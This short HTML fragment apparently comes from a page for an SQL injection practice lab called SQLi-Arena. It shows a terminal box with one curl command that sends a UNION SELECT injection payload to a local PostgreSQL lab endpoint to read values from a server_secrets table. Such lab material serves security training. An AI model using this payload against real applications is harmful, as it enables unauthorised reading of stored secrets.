...
<div class="terminal">
    ...
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab7" \<br> --data-urlencode "search=' UNION SELECT id, secret_value, secret_value FROM server_secrets --"<br><br>
